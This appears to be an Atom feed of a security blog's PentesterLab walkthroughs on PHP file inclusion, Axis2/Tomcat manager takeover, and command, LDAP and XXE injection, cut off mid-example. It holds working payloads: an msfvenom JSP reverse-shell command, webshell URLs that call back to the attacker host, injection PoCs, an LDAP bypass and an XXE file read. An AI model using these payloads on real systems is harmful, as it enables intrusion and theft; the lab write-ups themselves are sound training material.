<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: pentesterlab | F4l13n5n0w]]></title>
  <link href="http://f4l13n5n0w.github.io/blog/categories/pentesterlab/atom.xml" rel="self"/>
  <link href="http://f4l13n5n0w.github.io/"/>
  <updated>2015-12-08T05:13:54-05:00</updated>
  <id>http://f4l13n5n0w.github.io/</id>
  <author>
    <name><![CDATA[F4l13n5n0w]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[[PentesterLab] PHP LFI &amp; Post Exploitation]]></title>
    <link href="http://f4l13n5n0w.github.io/blog/2015/05/31/pentesterlab-php-lfi-and-post-exploitation/"/>
    <updated>2015-05-31T05:19:10-04:00</updated>
    <id>http://f4l13n5n0w.github.io/blog/2015/05/31/pentesterlab-php-lfi-and-post-exploitation</id>
    <content type="html"><![CDATA[<p>&ldquo;This course details the discovery and the exploitation of PHP include vulnerabilities in a limited environment.
Then it introduces the basics of post exploitation: shell, reverse-shell and TCP redirection.&rdquo; &ndash; <a href="https://www.pentesterlab.com/">PentesterLab</a></p>

<p>More information and ISO download please check <a href="https://www.pentesterlab.com/exercises/php_include_and_post_exploitation/">here</a>. The official <a href="https://www.pentesterlab.com/exercises/php_include_and_post_exploitation/course">course</a> is highly recommanded to read.</p>

<p>Difficulty: 2 / 5</p>

<!-- more -->


<h2>Links</h2>

<p>watch video online:
<iframe src='http://player.vimeo.com/video/101763491?byline=0&amp;portrait=0&amp;color=c9ff23' width='720' height='360' frameborder='0' webkitAllowFullScreen mozallowfullscreen allowFullScreen></iframe></p>

<h2>Method</h2>

<ul>
<li>Scanned the network to discover the target server [Net Discover]</li>
<li>Port scanned the target to determine the running services on the target [Unicorn Scan]</li>
<li>Interacted with the web server, found the Local File Include (LFI) vulnerable point and a page with upload function. [Firefox]</li>
<li>Construct and upload a PHP shell onto the web server (have to bypass server end file validation). [Burp proxy]</li>
<li>Gain remote access by running the PHP shell via LFI vulnerability which we found before. [Burp proxy]</li>
</ul>


<h2>Tools</h2>

<p>All the tools used here can be found in Kali linux
* <a href="http://nixgeneration.com/~jaime/netdiscover/">Net Discover</a>
* <a href="http://www.unicornscan.org/">Unicorn Scan</a>
* <a href="https://www.mozilla.org/en-US/firefox/new/">Firefox</a>
* <a href="http://netcat.sourceforge.net/">Netcat</a>
* <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">php-reverse-shell</a>
* <a href="https://www.gnu.org/software/wget/">Wget</a></p>

<h2>Walkthrough</h2>

<p>By reading the training <a href="https://www.pentesterlab.com/exercises/php_include_and_post_exploitation/course">course</a>, we know what kind of vulnerabilities should be targeted to. (PHP Include vulnerability is focused on this course)</p>

<h3>Find the LFI weakness</h3>

<p>The attacker interacts with the web server, by using Firefox browser to graphically render the web application on the target. Upon viewing the page, the attacker know that this site is calling for papers for a conference.</p>

<p>On the right hand side, which is the navigation menu to <font color="red"><em>home</em></font> (show the home page), <font color="red"><em>submit</em></font> (jump to paper upload form page) and <font color="red"><em>login</em></font> (which asks the attacker to login).</p>

<p>The attacker noticed the URL’s parameter is <code>?page=submit</code> in submit page and <code>?page=login</code> in login page. After the attacker tried to replace the parameter <code>submit</code> in submit page to <code>./login</code> and the login page is presented from the web server. That means here is the LFI vulnerable point.</p>

<p>In order to double check this vulnerability, the attacker construct the following URL <code>http://10.10.10.130/index.php?page=/etc/passwd</code> to extract the default passwd file in Linux. The attacker also check if the server is vulnerable to RFI by constructing the following URL <code>http://10.10.10.130/index.php?page=http://www.google.com/?</code>. However the server sent back error information which is illustrated that the PHP function for Remote file include is currently turned off (<font color="red"><em>allow_url_fopen = On but allow_url_include = Off</em></font>).</p>

<h3>Find the way to upload file (web shell) and the path where the uploaded file saved</h3>

<p>In the submit page, the attacker only can upload a pdf file to the server (<em>white list and file content is validated on the server end</em>).</p>

<p>Then the attacker input everything the form required and submit a normal pdf file. After that, successful uploaded page is presented. The attacker login to the web server with the information he just provided in the submit form and he found the uploaded PDF file is saved under the <code>uploads</code> folder.</p>

<h3>Bypass file upload validation</h3>

<p>The attacker can only upload a PDF file due to the white list and file content validation is running on the server side. However, many file content validation only check file header which usually first bytes of a file. So the attacker create a fake PDF file (evil.pdf) which has normal PDF header and followed by the PHP shell code (<em>here the attacker using <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">Pentest Monkey’s PHP reserve shell</a>, which is able to connect back from the target to the attacker</em>).</p>

<p>Then the attacker upload the file <code>evil.php</code> to the server. Because it is only executed when someone visits the page, the attacker quickly creates a listener to wait for the PHP shell to connect back.</p>

<p>After the attacker browse the page on the server, it causes the PHP code to be executed and a connection back to the attacker. Now, the attacker has an interactive shell on the target.</p>

<h2>Reference:</h2>

<ol>
<li><a href="https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion">OWASP Test LFI</a></li>
<li><a href="http://en.wikipedia.org/wiki/Passwd">passwd file</a></li>
<li><a href="http://php.net/manual/en/filesystem.configuration.php">php.ini configuration file</a></li>
<li><a href="https://www.owasp.org/index.php/Unrestricted_File_Upload">Bypass file upload validation</a></li>
</ol>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[[PentesterLab] Axis2 Web service and Tomcat Manager]]></title>
    <link href="http://f4l13n5n0w.github.io/blog/2015/05/30/pentesterlab-axis2-web-service-and-tomcat-manager/"/>
    <updated>2015-05-30T08:16:43-04:00</updated>
    <id>http://f4l13n5n0w.github.io/blog/2015/05/30/pentesterlab-axis2-web-service-and-tomcat-manager</id>
    <content type="html"><![CDATA[<p>&ldquo;This course details the exploitation of an issue in an Axis2 Web service and how using this issue it is possible to retrieve arbitrary files. Then using this, we will see how an attacker can retrieve Tomcat users' file to access the Tomcat Manager and gain commands execution on the server.&rdquo; &ndash; <a href="https://www.pentesterlab.com/">PentesterLab</a></p>

<p>More information and ISO download please check <a href="https://www.pentesterlab.com/exercises/axis2_and_tomcat_manager/">here</a>. The official <a href="https://www.pentesterlab.com/exercises/axis2_and_tomcat_manager/course">course</a> is highly recommanded to read.</p>

<p>Difficulty: 3 / 5</p>

<!-- more -->


<h2>Walkthrough</h2>

<p>Based on the result of NMAP scan, tcp port 80 is open.</p>

<p>Access tcp port 80 and use DirBuster/wfuzz to brute force hidden path and found &ldquo;/axis2&rdquo;:</p>

<p>wfuzz command to burte force hidden path:
<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt &ndash;hc 404 &lt;a href="http://10.10.10.129/FUZZ">http://10.10.10.129/FUZZ&lt;/a> 2>/dev/null</span></code></pre></td></tr></table></div></figure></p>

<p><img src="/downloads/Axis2_Web_Tomcat/1.png"></p>

<p>Due to axis2&rsquo;s ProxyService has information retrieving vulnerability, exploit it and find users' passwords information.</p>

<p>Here are two methods to upload webshell.</p>

<h3>Method 1</h3>

<p>Retrieving Tomcat manager configuration to get login credentials.</p>

<p>In Debian Linux, the tomcat configuration file <code>tomcat-users.xml</code> has default location: <font color="red"><em>/etc/tomcat6/tomcat-users.xml</em></font></p>

<p><img src="/downloads/Axis2_Web_Tomcat/2.png"></p>

<p>From <code>tomcat-users.xml</code> file, the tomcat manager-gui login password can be found: <font color="red"><em>manager / !mp0ss!bl32gu355</em></font></p>

<p>Then login tomcat manager from the URL <code>http://10.10.10.129/manager/html</code> to upload and deploy JSP webshell in WAR file.</p>

<p>Use msfvenom to generate JSP reverse shell and build the war file using <code>jar</code>:</p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>$ mkdir webshell
</span><span class='line'>$ cd webshell
</span><span class='line'>$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.131 LPORT=4444 -f raw > sh4.jsp
</span><span class='line'>$ jar -cvf ../webshell.jar *</span></code></pre></td></tr></table></div></figure></p>

<p>Use the following URL to trigger reverse shell connect back to my Kali on port 4444:</p>

<p><code>http://10.10.10.129/webshell/sh4.jsp</code></p>

<p><img src="/downloads/Axis2_Web_Tomcat/3.png"></p>

<h3>Method 2</h3>

<p>Retrieving Axis2 configuration to get login credentials.</p>

<p>In Debian Linux, the axis2 configuration file <code>axis2.xml</code> has default location: <font color="red"><em>/var/lib/tomcat6/webapps/axis2/WEB-INF/conf/axis2.xml</em></font></p>

<p><img src="/downloads/Axis2_Web_Tomcat/4.png"></p>

<p>From <code>axis2.xml</code> file, the axis2 admin login password can be found: <font color="red">admin / axis2</font></p>

<p>Then login axis2 admin page from the URL <code>http://10.10.10.129/axis2/axis2-admin/</code> to upload and deploy axis2 webshell in AAR file.</p>

<p>Here I use <code>Cat.aar</code> <a href="https://github.com/tennc/webshell/tree/master/other/cat.aar">axis2 webshell</a>, upload and deploy it as axis2 service.</p>

<p><img src="/downloads/Axis2_Web_Tomcat/5.png"></p>

<p>Then use the following URL to trigger reverse shell connect back to my Kali on port 5555:</p>

<p><code>http://10.10.10.129/axis2/services/Cat/shell?host=10.10.10.131&amp;port=5555</code></p>

<p><img src="/downloads/Axis2_Web_Tomcat/6.png"></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[[PentesterLab] Web for Pentester - FINAL]]></title>
    <link href="http://f4l13n5n0w.github.io/blog/2015/05/23/pentesterlab-web-for-pentester-final/"/>
    <updated>2015-05-23T00:52:14-04:00</updated>
    <id>http://f4l13n5n0w.github.io/blog/2015/05/23/pentesterlab-web-for-pentester-final</id>
    <content type="html"><![CDATA[<p>&ldquo;This course details all you need to know to start doing web penetration testing. PentesterLab tried to put together the basics of web testing and a summary of the most common vulnerabilities with the LiveCD to test them.&rdquo; &ndash; PentesterLab</p>

<p>Due to this is quite a long course, I have to divide the course into several parts and this is the last one will focus on several different types of injection: Commands injection, LDAP injection and XML injection. More information and ISO download please check <a href="https://www.pentesterlab.com/exercises/web_for_pentester/">here</a>. The official <a href="https://www.pentesterlab.com/exercises/web_for_pentester/course">course</a> is highly recommanded to read.</p>

<p>Difficulty: 1 / 5</p>

<!-- more -->


<h1>Commands Injection</h1>

<p><blockquote><p>Command injection is an attack in which the goal is execution of arbitrary commands on the host operating system via a vulnerable application. Command injection attacks are possible when an application passes unsafe user supplied data (forms, cookies, HTTP headers etc.) to a system shell. In this attack, the attacker-supplied operating system commands are usually executed with the privileges of the vulnerable application. Command injection attacks are possible largely due to insufficient input validation.</p><footer><strong>OWASP <a href="https://www.owasp.org/index.php/Command_Injection">https://www.owasp.org/index.php/Command_Injection</a> Command Injection</strong></footer></blockquote></p>

<h2>Example 1</h2>

<p>Code review:
<figure class='code'><figcaption><span>example1.php </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">?</span><span class="nx">php</span> <span class="k">require_once</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="o">../</span><span class="nb">header</span><span class="o">.</span><span class="nx">php</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;);</span> <span class="cp">?&gt;</span><span class="x">&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="x">&lt;pre&gt;</span>
</span><span class='line'><span class="cp">&lt;?php</span>
</span><span class='line'>  <span class="nb">system</span><span class="p">(</span><span class="s2">&quot;ping -c 2 &quot;</span><span class="o">.</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;ip&#39;</span><span class="p">]);</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span><span class='line'><span class="x">&lt;/pre&gt;</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="x">&lt;p&gt;&amp;lt;?php require_once(&amp;ldquo;../footer.php&amp;rdquo;); ?&gt;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>This one is simple and directly exploitable.</p>

<p>From the page we know the command ping $ip is running on server side and return the result to the client. Due to there is no input validation, we can inject payload to construct multi commands in one line with &ldquo;;&rdquo;, &ldquo;|&rdquo; or &ldquo;&amp;&amp;&rdquo;, for example, &ldquo;ping 127.0.0.1; id&rdquo; or &ldquo;ping 127.0.0.1 &amp;&amp; id&rdquo;.</p>

<p>PoC:</p>

<p><code>http://10.10.10.129/commandexec/example1.php?ip=127.0.0.1 %26%26 id</code></p>

<p><code>http://10.10.10.129/commandexec/example1.php?ip=127.0.0.1; id</code></p>

<p><code>http://10.10.10.129/commandexec/example1.php?ip=127.0.0.1| id</code></p>

<h2>Example 2</h2>

<p>Code review:
<figure class='code'><figcaption><span>example2.php </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">?</span><span class="nx">php</span> <span class="k">require_once</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="o">../</span><span class="nb">header</span><span class="o">.</span><span class="nx">php</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;);</span> <span class="cp">?&gt;</span><span class="x">&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="x">&lt;pre&gt;</span>
</span><span class='line'><span class="cp">&lt;?php</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">&#39;/^\d{1,3}\.\d{1,3}\.\d{1,3}.\d{1,3}$/m&#39;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;ip&#39;</span><span class="p">])))</span> <span class="p">{</span>
</span><span class='line'>     <span class="k">die</span><span class="p">(</span><span class="s2">&quot;Invalid IP address&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="nb">system</span><span class="p">(</span><span class="s2">&quot;ping -c 2 &quot;</span><span class="o">.</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;ip&#39;</span><span class="p">]);</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span><span class='line'><span class="x">&lt;/pre&gt;</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="x">&lt;p&gt;&amp;lt;?php require_once(&amp;ldquo;../footer.php&amp;rdquo;); ?&gt;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>From the source code above, we can see that <a href="http://php.net/manual/en/reference.pcre.pattern.modifiers.php">PRCE Modifier &ldquo;m&rdquo;</a> is used in preg_match function. As a result, we can bypass this validation by using newline &ldquo;<em><font color="red">%0a</font></em>&rdquo;.</p>

<p>PoC:</p>

<p><code>http://10.10.10.129/commandexec/example2.php?ip=127.0.0.1%0aid</code></p>

<h2>Example 3</h2>

<p>Code review:
<figure class='code'><figcaption><span>example3.php </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">?</span><span class="nx">php</span> <span class="k">require_once</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="o">../</span><span class="nb">header</span><span class="o">.</span><span class="nx">php</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;);</span> <span class="cp">?&gt;</span><span class="x">&lt;/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="x">&lt;pre&gt;</span>
</span><span class='line'><span class="cp">&lt;?php</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s1">&#39;/^\d{1,3}\.\d{1,3}\.\d{1,3}.\d{1,3}$/&#39;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;ip&#39;</span><span class="p">])))</span> <span class="p">{</span>
</span><span class='line'>     <span class="nb">header</span><span class="p">(</span><span class="s2">&quot;Location: example3.php?ip=127.0.0.1&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="nb">system</span><span class="p">(</span><span class="s2">&quot;ping -c 2 &quot;</span><span class="o">.</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;ip&#39;</span><span class="p">]);</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span><span class='line'><span class="x">&lt;/pre&gt;</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="x">&lt;p&gt;&amp;lt;?php require_once(&amp;ldquo;../footer.php&amp;rdquo;); ?&gt;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>This time the <em>preg_match</em> function did a good validation on user&rsquo;s input. However, the script didn&rsquo;t stop when evil character is matched in user&rsquo;s input. Instead of, it only use header function to do a redirection without die function to stop the script.</p>

<p>So the attacking methods (&lsquo;;&rsquo;, &lsquo;&amp;&amp;&rsquo; and &lsquo;|&rsquo;) still works on this one, but it will need a proxy like <strong><em>burpsuite</em></strong> or <strong><em>nc/telnet</em></strong> to read the first response page.</p>

<p>PoC:</p>

<p>Use <strong><em>NC</em></strong> to exploit this vulnerability</p>

<p><code>echo -e "GET /commandexec/example3.php?ip=127.0.0.1;id HTTP/1.1\r\nHost: 10.10.10.129\r\nConnection: close\r\n" | nc 10.10.10.129 80</code></p>

<p><code>echo -e "GET /commandexec/example3.php?ip=127.0.0.1|id HTTP/1.1\r\nHost: 10.10.10.129\r\nConnection: close\r\n" | nc 10.10.10.129 80</code></p>

<p><code>echo -e "GET /commandexec/example3.php?ip=127.0.0.1%26%26id HTTP/1.1\r\nHost: 10.10.10.129\r\nConnection: close\r\n" | nc 10.10.10.129 80</code></p>

<h1>LDAP Injection</h1>

<p><blockquote><p>LDAP Injection is an attack used to exploit web based applications that construct LDAP statements based on user input. When an application fails to properly sanitize user input, it’s possible to modify LDAP statements using a local proxy. This could result in the execution of arbitrary commands such as granting permissions to unauthorized queries, and content modification inside the LDAP tree. The same advanced exploitation techniques available in SQL Injection can be similarly applied in LDAP Injection.</p><footer><strong><a href="https://www.owasp.org/index.php/LDAP_injection">https://www.owasp.org/index.php/LDAP_injection</a> LDAP Injection</strong></footer></blockquote></p>

<h2>Example 1</h2>

<p>Code review:
<figure class='code'><figcaption><span>example1.php </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">?</span><span class="nx">php</span>
</span><span class='line'>  <span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span> <span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="nv">$ld</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>   <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="err">$</span><span class="o">&lt;</span><span class="nx">em</span><span class="o">&gt;</span><span class="nx">GET</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">username</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;]))</span> <span class="p">{</span>
</span><span class='line'>     <span class="nv">$user</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">uid</span><span class="o">=&amp;</span><span class="nx">rdquo</span><span class="p">;</span><span class="o">.</span><span class="err">$</span><span class="o">&lt;/</span><span class="nx">em</span><span class="o">&gt;</span><span class="nx">GET</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">username</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;]</span><span class="o">.&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">ou</span><span class="o">=</span><span class="nx">people</span><span class="p">,</span><span class="nx">dc</span><span class="o">=</span><span class="nx">pentesterlab</span><span class="p">,</span><span class="nx">dc</span><span class="o">=</span><span class="nx">com</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;;</span>
</span><span class='line'>   <span class="p">}</span>
</span><span class='line'>   <span class="nv">$lb</span> <span class="o">=</span> <span class="o">@</span><span class="nb">ldap_bind</span><span class="p">(</span><span class="nv">$ld</span><span class="p">,</span> <span class="nv">$user</span><span class="p">,</span><span class="nv">$_GET</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">password</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;]);</span>
</span><span class='line'>   <span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span> <span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure></p>

<p>Due to the developer use ldap_bind function which will make an anonymous bind if both parameters are not specified, the attacker can bypass the authentication by removing all the parameters from the query.</p>

<p>PoC:</p>

<p><code>http://10.10.10.129/ldap/example1.php</code></p>

<h2>Example 2</h2>

<p>Code review:
<figure class='code'><figcaption><span>example2.php </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">?</span><span class="nx">php</span>
</span><span class='line'>    <span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span> <span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span>
</span><span class='line'>    <span class="nv">$pass</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;{</span><span class="nx">MD5</span><span class="p">}</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;</span><span class="o">.</span><span class="nb">base64_encode</span><span class="p">(</span><span class="nb">pack</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="nx">H</span><span class="o">*&amp;</span><span class="nx">rdquo</span><span class="p">;,</span><span class="nb">md5</span><span class="p">(</span><span class="err">$</span><span class="o">&lt;</span><span class="nx">em</span><span class="o">&gt;</span><span class="nx">GET</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">password</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;])));</span>
</span><span class='line'>    <span class="nv">$filter</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;(</span><span class="o">&amp;</span><span class="nx">amp</span><span class="p">;(</span><span class="nx">cn</span><span class="o">=&amp;</span><span class="nx">rdquo</span><span class="p">;</span><span class="o">.</span><span class="err">$</span><span class="o">&lt;/</span><span class="nx">em</span><span class="o">&gt;</span><span class="nx">GET</span><span class="p">[</span><span class="o">&amp;</span><span class="nx">lsquo</span><span class="p">;</span><span class="nx">name</span><span class="o">&amp;</span><span class="nx">rsquo</span><span class="p">;]</span><span class="o">.&amp;</span><span class="nx">ldquo</span><span class="p">;)(</span><span class="nx">userPassword</span><span class="o">=&amp;</span><span class="nx">rdquo</span><span class="p">;</span><span class="o">.</span><span class="nv">$pass</span><span class="o">.&amp;</span><span class="nx">ldquo</span><span class="p">;))</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;;</span>
</span><span class='line'>    <span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span> <span class="o">&amp;</span><span class="nx">hellip</span><span class="p">;</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span></code></pre></td></tr></table></div></figure></p>

<p>After checking the source code, the attacker can bypass the authentication by using the following exploit payload:</p>

<p><code>http://10.10.10.129/ldap/example2.php?name=hacker)(cn=*))%00&amp;password=asdfasdf</code></p>

<p>the variable <em>$filter</em> will become to &ldquo;<font color="red">(&amp;(cn=hacker)(cn=*))%00)(userPassword=[pass]))</font>&rdquo; which <strong><em>%00</em></strong> will get rid of all the following strings.</p>

<p>More information about testing LDAP injection, please check the OWASP article <a href="https://www.owasp.org/index.php/Testing_for_LDAP_Injection_(OTG-INPVAL-007)">Testing for LDAP Injection</a></p>

<h1>XML Injection</h1>

<h2>Example 1</h2>

<p>Code review:
<figure class='code'><figcaption><span>example1.php </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">?</span><span class="nx">php</span> <span class="k">require_once</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="o">../</span><span class="nb">header</span><span class="o">.</span><span class="nx">php</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;);</span> <span class="cp">?&gt;</span><span class="x"></span>
</span><span class='line'><span class="x">Hello&lt;br/&gt;</span>
</span><span class='line'><span class="x">&amp;lt;?php</span>
</span><span class='line'><span class="x">  $xml=simplexml_load_string($_GET[&amp;lsquo;xml&amp;rsquo;]);</span>
</span><span class='line'><span class="x">  print_r((string)$xml);</span>
</span><span class='line'><span class="x">?&gt;</span>
</span><span class='line'><span class="x">&amp;lt;?php require_once(&amp;ldquo;../footer.php&amp;rdquo;); ?&gt;</span>
</span></code></pre></td></tr></table></div></figure></p>

<p>XML eXternal Entity (XXE) attack:
<blockquote><p>External Entity: The set of valid entities can be extended by defining new entities. If the definition of an entity is a URI, the entity is called an external entity. Unless configured to do otherwise, external entities force the XML parser to access the resource specified by the URI, e.g., a file on the local machine or on a remote systems. This behavior exposes the application to XML eXternal Entity (XXE) attacks, which can be used to perform denial of service of the local system, gain unauthorized access to files on the local machine, scan remote machines, and perform denial of service of remote systems.</p><footer><strong>OWASP <a href="https://www.owasp.org/index.php/Testing_for_XML_Injection_">https://www.owasp.org/index.php/Testing_for_XML_Injection_</a>(OTG-INPVAL-008) Testing_for_XML_Injection</strong></footer></blockquote></p>

<p>Attacking payload (read system file: /etc/passwd):</p>

<p><code>&lt;!DOCTYPE test [&lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;]&gt;&lt;test&gt;&amp;xxe;&lt;/test&gt;</code></p>

<p>PoC (with URL encoded):</p>

<p><code>http://10.10.10.129/xml/example1.php?xml=%3C%21DOCTYPE%20test%20%5B%3C%21ENTITY%20xxe%20SYSTEM%20%22file%3A%2f%2f%2fetc%2fpasswd%22%3E%5D%3E%3Ctest%3E%26xxe%3B%3C%2ftest%3E</code></p>

<h2>Example 2</h2>

<p>Code review:
<figure class='code'><figcaption><span>example2.php </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&amp;</span><span class="nx">lt</span><span class="p">;</span><span class="o">?</span><span class="nx">php</span> <span class="k">require_once</span><span class="p">(</span><span class="o">&amp;</span><span class="nx">ldquo</span><span class="p">;</span><span class="o">../</span><span class="nb">header</span><span class="o">.</span><span class="nx">php</span><span class="o">&amp;</span><span class="nx">rdquo</span><span class="p">;);</span><span class="o">&lt;/</span><span class="nx">p</span><span class="o">&gt;</span>
</span><span class='line'>
